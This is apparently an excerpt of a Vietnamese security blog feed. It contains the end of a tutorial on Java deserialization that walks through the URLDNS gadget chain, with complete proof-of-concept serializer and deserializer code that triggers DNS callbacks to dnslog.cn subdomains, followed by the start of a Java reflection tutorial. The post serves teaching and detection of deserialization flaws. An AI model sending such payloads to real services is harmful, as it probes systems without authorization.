class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br></pre></td></tr></table></figure></li></ul><h1 id="Cach-ma-lo-hong-Deserialization-xay-ra"><a href="#Cach-ma-lo-hong-Deserialization-xay-ra" class="headerlink" title="Cách mà lỗ hổng Deserialization xảy ra:"></a>Cách mà lỗ hổng Deserialization xảy ra:</h1><p>Ở đây mình dùng Intellij để thực hiện, một IDEA rất tiện lợi mà ai làm việc với Java đều sử dụng.<br>Mình chỉ nói đến một chuỗi cơ bản để các bạn có thể hình dung cách thực hiện và bắt đầu với Deserialization trong Java nhé ^^.</p><h2 id="1-HashMap-va-cach-no-gay-ra-lo-hong-Deserialization"><a href="#1-HashMap-va-cach-no-gay-ra-lo-hong-Deserialization" class="headerlink" title="1. HashMap và cách nó gây ra lỗ hổng Deserialization:"></a>1. HashMap và cách nó gây ra lỗ hổng Deserialization:</h2><p>Gõ <strong>Ctrl + N</strong> và tìm kiếm lớp <strong>HashMap</strong>:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/JavaDeserializationBasicPic2.webp"></p><p>Lớp HashMap này có implements lớp Serializable vậy nên chúng ta có thể dùng nó để lợi dụng quá trình Ser và Deser.</p><p>Tiếp theo mở phần Structure và tìm kiến method <strong>readObject</strong> của lớp <strong>HashMap</strong>:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/JavaDeserializationBasicPic3.webp"></p><p>Trong method readObject ta thấy có phần quan trọng ở đây:</p><ul><li>Đầu tiên thực hiện gán key và value &#x3D; s.readObject()</li><li>Sau đó thực hiện hàm putVal(), điểm cần chú ý ở đây là nó đưa key vào method hash().<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/putValinReadObject.png"></li></ul><p><code>Ctrl + Chuột</code> trái để đi vào phương thức hash():<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/hash.png"><br>Trong phương thức hash này, nếu key &#x3D;&#x3D; null sẽ return 0, còn không thì sẽ thực hiện <code>h = key.hashCode()) ^ (h &gt;&gt;&gt; 16)</code> rồi return h.<br>Điểm mà chúng ta cần chú ý ở đây là nó thực hiện key.hashCode() mình sẽ đi sâu một chút cho các bạn dễ hiểu:</p><ul><li>Trong Java có một lớp là cha của mọi lớp đó là lớp Object, nó có các phương thức như toString(), hashCode(),…</li><li>key là một object của lớp hashMap mà implements ngầm lớp Object (vì nó cha của mọi lớp mà) vậy nên nó thừa hưởng các phương thức của lớp Object. Nên ở đây chúng ta có thể gọi key.hashCode()</li></ul><p>Việc gọi hashCode() ở đây có ý nghĩa gì thì chúng ta cùng đi sâu vào chuổi URLDNS nhé!</p><h2 id="2-Phan-tich-chuoi-URLDNS"><a href="#2-Phan-tich-chuoi-URLDNS" class="headerlink" title="2. Phân tích chuỗi URLDNS:"></a>2. Phân tích chuỗi URLDNS:</h2><p>Chuỗi URLDNS là một chuỗi đơn giản nhất trong các gadget chain (đương nhiên sẽ hơi khó hiểu với người bắt đầu, keep going ^^). Chuỗi này không thực sự gây ra một vấn đề gì nghiêm trọng như là RCE hay là SSRF…, kết quả của chuỗi này là thực hiện một yêu cầu DNS đến địa chỉ mà chúng ta đưa vào. Nó có kết quả phải không nào ^^, vậy nên chuỗi này sẽ giúp các bạn biết được một gadget chain sẽ xảy ra như thế nào. Cố gắng viết code, đọc hiểu để nhanh tiến bộ nhé ٩(^‿^)۶…</p><p>Chuỗi thực thi của URLDNS như sau:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.putVal()</span><br><span class="line">            HashMap.hash()</span><br><span class="line">                URL.hashCode()</span><br></pre></td></tr></table></figure><p>Để tạo một HashMap, đầu tiên chúng ta thực hiện tạo một object hashmap, sau đó chúng ta sẽ thực hiện hàm put() để đưa dữ liệu vào trong object HashMap đó.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://0tvykt.dnslog.cn&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ở đây tham số đầu tiên của hàm put() là một object key, và tham số thứ hai là value. Hai biến này tương ứng với key và value mình đã phân tích ở trên phần phân tích về HashMap. Ở đây vì key nhận vào là một object nên ở đây chúng ta sẽ tạo một object URL để thực hiện chain này.<br>Bây giờ, giả sử như chúng ta thực hiện readObject hashmap, nó sẽ đi theo sơ đồ:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.putVal()</span><br><span class="line">            HashMap.hash()</span><br><span class="line">                URL.hashCode()</span><br></pre></td></tr></table></figure><p>Và đến đây, phương thức hashCode() được gọi sau khi readObject() sẽ phát huy tác dụng. Chúng ta sẽ đi sâu vào phần này:<br>Tiếp tục chúng ta tìm class URL rồi tìm đến method hashCode().<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashCodeOfURLObject.webp"></p><p>Ở đây, phương thức <code>hashCode()</code> của lớp Object đã được định nghĩa lại trong lớp URL:</p><ul><li>Nếu <code>hashCode</code> không bằng -1 thì sẽ thực hiện <code>return hashCode</code> bởi vì nó đã được set rồi.</li><li>Nếu không thì <code>hashCode</code> sẽ được gán bằng <code>handler.hashCode(this)</code>, this ở đây có nghĩa là nó sẽ lấy object của lớp hiện tại đưa vào handler.hashCode rồi thực hiện tiếp.<br>Tiến hành <code>Ctrl+Chuột trái</code> rồi nhấn vào handler để đi đến nơi mà biến hanler được tạo.<br><code>Ảnh biến handler</code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br></pre></td></tr></table></figure>Biến handler ở đây là một object của lớp <code>URLStreamHandler</code>, object này sẽ gọi đến phương thức hashCode() được định nghĩa trong lớp này. Tiến hành <code>Ctrl+Chuột trái</code> rồi click vào <code>URLStreamHandler</code>, rồi tìm đến phương thức hashCode().</li></ul><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashCodeOfURLStreamHandler.webp"></p><p>Trong phương thức này chúng ta thấy dòng <code>InetAddress addr = getHostAddress(u);</code> có nghĩa là nó sẽ thực hiện một yêu cầu DNS đến địa chỉ URL để thực hiện getHostAddress. Đến đây ta đạt được mục đích của Chain này đó là request đến địa chỉ URL mà ta cung cấp. Còn lại phần sau và việc nó thực hiện request thế nào thì chúng ta không cần quan tâm, chỉ vậy là đã đủ (Đương nhiên bạn nào thích thì cứ tìm hiểu nhé ^^).</p><h2 id="3-POC-cho-chuoi-URLDNS"><a href="#3-POC-cho-chuoi-URLDNS" class="headerlink" title="3. POC cho chuỗi URLDNS:"></a>3. POC cho chuỗi URLDNS:</h2><p>Link nhận DNS request: <a href="http://dnslog.cn/">http://dnslog.cn/</a></p><h3 id="Chu-y-khi-thuc-hien-serialize-object-cua-lop-HashMap"><a href="#Chu-y-khi-thuc-hien-serialize-object-cua-lop-HashMap" class="headerlink" title="Chú ý khi thực hiện serialize object của lớp HashMap:"></a>Chú ý khi thực hiện serialize object của lớp HashMap:</h3><p>Filename: SerializeTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BasicChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;Ser2.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://0tvykt.dnslog.cn&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Sau khi chạy file này, dù chưa thực hiện deserialize file <code>Ser2.txt</code> mà chúng ta đã nhận được request đến. Nguyên nhân là do khi thực hiện gán giá trị vào object hashmap bằng hashmap.put(), hàm hash trong phương thức này đã được thực hiện và sẽ request đến địa chỉ URL mà ta cung cấp.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashMapPutMethod.webp"><br>Sau khi request đến URL, biến hashcode bây giờ đã không còn là -1 nữa, khi đó trong quá trình deserialize request sẽ không được gửi đến. Vậy nên sau khi thực hiện deserialize, chúng ta cần thực hiện set lại giá trị cho hashcode là -1. Tuy nhiên vấn đề ở đây là biến hashcode là private, để gán lại giá trị cho biến private chúng ta cần sử dụng đến Reflection mà mình đã có bài viết về nó.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashCodeOfURLObject.webp"></p><h3 id="POC-hoan-thien-cua-chuoi-URLDNS"><a href="#POC-hoan-thien-cua-chuoi-URLDNS" class="headerlink" title="POC hoàn thiện của chuỗi URLDNS:"></a>POC hoàn thiện của chuỗi URLDNS:</h3><p>file: SerializeTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BasicChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;Ser2.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://2g1hil.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        <span class="comment">//Field hashcode = url.getClass().getDeclaredField(&quot;hashCode&quot;); Cách khác để lấy field hashcode</span></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(url, -<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>file: Deser.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BasicChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Deser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Deserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        Deserialize(<span class="string">&quot;ser2.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Kết quả:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/DNSresult.webp"></p><p>Vậy là mình đã giới thiệu xong về cơ bản của quá trình Deserialization và đi qua hết chuỗi URLDNS. Đây chỉ là những kiến thức cơ bản của lỗ hổng Java Deserialization. Để hiểu sâu hơn về lỗ hổng này, mình thực sự khuyên các bạn hãy hiểu tường tận về những keyword sau: “Class Class”, “Class Object”, “Class Runtime”, “Reflection”, các khái niệm về OOP, và còn nhiều thứ khác nữa. Và hãy cố gắng đọc hiểu và tự mình viết POC cho lỗ hổng này, khá khó để bắt đầu nhưng hi vọng các bạn có thể vượt qua.</p><blockquote><p>Hành trình nào mà không có gian nan, đau khổ ^^… Chúc các bạn học tốt~</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Bài viết này là về những concept cơ bản của quá trình Serialization và Deserialization và cách mà lỗ hổng Java Deserialization được thực </summary>
      
    
    
    
    <category term="Java" scheme="https://rayinaw.github.io/categories/Java/"/>
    
    <category term="Deserialization" scheme="https://rayinaw.github.io/categories/Java/Deserialization/"/>
    
    
    <category term="Java" scheme="https://rayinaw.github.io/tags/Java/"/>
    
    <category term="Deserialization" scheme="https://rayinaw.github.io/tags/Deserialization/"/>
    
  </entry>
  
  <entry>
    <title>Java Reflection</title>
    <link href="https://rayinaw.github.io/2022/11/02/Java-reflection/"/>
    <id>https://rayinaw.github.io/2022/11/02/Java-reflection/</id>
    <published>2022-11-02T16:23:23.000Z</published>
    <updated>2022-12-15T10:12:23.884Z</updated>
    
    <content type="html"><![CDATA[<p>Lớp Java Reflection là một lớp thường xuyên được sử dụng vì sự tiện nghi của nó, nên chúng ta cũng có thể thường xuyên thấy những lớp này khi đi sâu vào những lỗ hổng của Java. Ngoài ra, trong Java Deserialization ta thường dùng lớp này để có thể truy cập vào các thuộc tính Private. </p><p>Trước khi đọc bài viết này, các bạn nên tìm hiểu lớp Class, Object.</p><p>Tản mạn thế là đủ rồi, ta cùng đi vào bài viết nào o(￣▽￣)ブ</p><h1 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h1><h2 id="1-Khai-niem"><a href="#1-Khai-niem" class="headerlink" title="1. Khái niệm:"></a>1. Khái niệm:</h2><p>Reflection là một tính năng của java, nó cho phép một chương trình đang chạy trực tiếp lấy ra các thuộc tính, phương thức,… và thao tác với nó.</p><p>Một điểm đặc biệt của Java reflection là nó cho phép thay đổi các thuộc tính Private của một Object.</p><h2 id="2-Cac-ham-cua-Java-reflection"><a href="#2-Cac-ham-cua-Java-reflection" class="headerlink" title="2. Các hàm của Java reflection:"></a>2. Các hàm của Java reflection:</h2><p>Ở đây mình chỉ liệt kê ra những hàm thường dùng của Reflection.</p><h3 id="Lay-ra-thuoc-tinh-cua-mot-lop-Field"><a href="#Lay-ra-thuoc-tinh-cua-mot-lop-Field" class="headerlink" title="Lấy ra thuộc tính của một lớp (Field):"></a>Lấy ra thuộc tính của một lớp (Field):</h3><p>Trong lớp Class có hai phương thức để lấy ra trường ở trong một lớp là getDeclaredFields() và getDeclaredField(String name).</p><ul><li>Phương thức getDeclaredFields() sẽ lấy ra tất cả những trường có ở trong class của object đó.</li><li>Phương thức getDeclaredField(String name) sẽ lấy ra một trường có tên là String mà chúng ta truyền vào.</li></ul><p>Hai phương thức này tương tự nhau chỉ là phương thức getDeclaredFields() sẽ lấy ra tất cả các field của Class đó rồi cho vào một mảng nên các bạn tự tìm hiểu nhé..</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">person</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person: &quot;</span>+ <span class="string">&quot;name = &#x27;&quot;</span>+ name + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflectionClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">person</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>(<span class="string">&quot;helen&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> a.getClass().getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);<span class="comment">//Cho phép truy cập tạm thời vào biến name để thay đổi, đây là cái hay của reflection.</span></span><br><span class="line">        name.set(a, <span class="string">&quot;Sayo&quot;</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Lay-ra-phuong-thuc-cua-mot-lop"><a href="#Lay-ra-phuong-thuc-cua-mot-lop" class="headerlink" title="Lấy ra phương thức của một lớp:"></a>Lấy ra phương thức của một lớp:</h3><table><thead><tr><th>Method</th><th>Public</th><th>Non-public</th><th>Inherited</th></tr></thead><tbody><tr><td>getMethod &amp; getMethods</td><td>✔️</td><td>❌</td><td>✔️</td></tr><tr><td>getDeclaredMethod &amp; getDeclaredMethods</td><td>✔️</td><td>✔️</td><td>❌</td></tr></tbody></table><ul><li><h4 id="Phuong-thuc-getMethod-va-getMethods"><a href="#Phuong-thuc-getMethod-va-getMethods" class="headerlink" title="Phương thức getMethod() và getMethods():"></a>Phương thức getMethod() và getMethods():</h4>Hàm getMethod() và getMethods() sẽ có thể lấy những method public và những method được kế thừa từ lớp cha của nó. Lớp getMethod() sẽ trả về một phương thức xác định, còn lớp getMethods() sẽ trả về một mảng các phương thức.</li><li><h4 id="Phuong-thuc-getDeclaredMethod-va-getDeclaredMethods"><a href="#Phuong-thuc-getDeclaredMethod-va-getDeclaredMethods" class="headerlink" title="Phương thức getDeclaredMethod() và getDeclaredMethods():"></a>Phương thức getDeclaredMethod() và getDeclaredMethods():</h4>Hàm getDeclaredMethod() và getDeclaredMethods() sẽ lấy ra những phương thức được định nghĩa ở trong class hiện tại, bao gồm cả Public và Non-public nhưng không thể lấy những class kế thừa như của getMethod(). Tương tự như vậy, lớp getDeclaredMethod() sẽ trả về một phương thức xác định, còn lớp getDeclaredMethods() sẽ trả về một mảng các phương thức.</li></ul><hr><p>Các phương thức đều tương tự nhau nên mình sẽ chỉ đưa ra một ví dụ:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">person</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">(String a, String b)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Do something....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person: &quot;</span>+ <span class="string">&quot;name = &#x27;&quot;</span>+ name + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflectionClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">person</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>(<span class="string">&quot;helen&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> a.getClass().getMethod(<span class="string">&quot;work&quot;</span>, String.class, String.class);</span><br><span class="line">        method.invoke(a, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>Class.getMethod()</code> nhận tham số đầu là string với tên của method, các tham số sau là lớp của đối số mà method cần lấy ra nhận vào. Như ví dụ trên, lớp work nhận vào 2 tham số là String nên chúng ta sẽ truyền vào String.class,…</p></li><li><p>method lấy ra bây giờ là một object của lớp <code>Method</code> bây giờ nó đại diện cho các method của những object thuộc chung một class có method được lấy ra. Trong lớp Method có một hàm invoke() dùng để gọi cái method đó. Và đương nhiên method bây giờ chưa phải là của object nào mà nó chỉ chung chung, bây giờ hàm invoke() sẽ nhận đối số đầu tiên là object chứa method đó, các giá trị sau là các tham số của method. </p></li><li><p>Lưu ý method chỉ sử dụng nếu các object là chung một class.</p></li></ul><h3 id="Phuong-thuc-getConstructor-va-getConstructors"><a href="#Phuong-thuc-getConstructor-va-getConstructors" class="headerlink" title="Phương thức getConstructor() và getConstructors():"></a>Phương thức getConstructor() và getConstructors():</h3><p>Phương thức này giúp chúng ta lấy ra một Constructor của một lớp và đưa vào lớp Constructor, từ Constructor được lấy ra, chúng ta có thể tạo một Object bằng hàm newInstance() ở trong lớp Constructor.<br>Phương thức getConstructors() tương tự, chỉ khác là nó sẽ đưa vào mảng.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;person&gt; personClass = person.class;</span><br><span class="line">        Constructor&lt;person&gt; personConstructor = personClass.getConstructor(String.class);</span><br><span class="line">        <span class="type">person</span> <span class="variable">a</span> <span class="operator">=</span> personConstructor.newInstance(<span class="string">&quot;Makune&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;person: &quot;</span> + a);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="Lay-ra-mot-lop-ma-khong-the-thao-tac-truc-tiep"><a href="#Lay-ra-mot-lop-ma-khong-the-thao-tac-truc-tiep" class="headerlink" title="Lấy ra một lớp mà không thể thao tác trực tiếp:"></a>Lấy ra một lớp mà không thể thao tác trực tiếp:</h3><h4 id="Phuong-thuc-forName"><a href="#Phuong-thuc-forName" class="headerlink" title="Phương thức forName"></a>Phương thức forName</h4><p>Để lấy ra một class chúng ta dùng phương thức forName.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span 